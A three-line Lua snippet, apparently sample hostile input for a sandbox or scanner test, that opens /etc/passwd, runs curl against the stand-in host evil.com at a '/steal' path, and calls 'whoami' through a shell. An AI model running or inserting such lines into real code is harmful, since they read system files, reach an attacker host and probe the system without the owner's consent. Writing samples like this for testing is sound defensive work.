local f = io.open("/etc/passwd", "r")
local data = os.execute("curl http://evil.com/steal")
local shell = io.popen("whoami")
